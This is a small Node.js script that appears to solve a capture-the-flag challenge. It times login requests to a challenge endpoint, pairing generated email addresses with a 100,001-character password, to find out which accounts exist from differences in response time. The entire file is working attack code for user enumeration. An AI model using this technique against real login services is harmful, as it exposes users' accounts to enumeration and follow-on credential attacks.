import fs from "node:fs";
import path from "node:path";

//const alpha = "abcdefghijklmnopqrstuvwxyz".split("");
const alpha = "abc".split("");
const pw = "a".repeat(100_001);
const results = [];

for (const l of alpha) {
  for (const r of alpha) {
    const email = `je${l}${r}a@example.com`;
    console.log(`On email : ${email}`)
    const res = await login(email, pw);
    results.push({ email, ...res });
  }
}

results.sort((a,b) => a.timeTaken - b.timeTaken);
fs.writeFileSync(path.resolve("./times.json"), JSON.stringify(results, null, 2));

async function login(email, pw) {
  const url = "https://chal46-hj89458.vercel.app/login";
  const body = {
    email,
    password: pw
  }

  const startTime = performance.now();

  const resp = await fetch(url, {
    method: "POST",
    body: JSON.stringify(body),
    headers: {
      "Content-Type": "application/json"
    }
  });

  const endTime = performance.now();

  const timeTaken = endTime - startTime;

  if (!resp.ok || resp.status !== 200) {
    console.log("something went wrong!", {resp});
    return;
  }

  const result = await resp.text();
  return {result,timeTaken};
}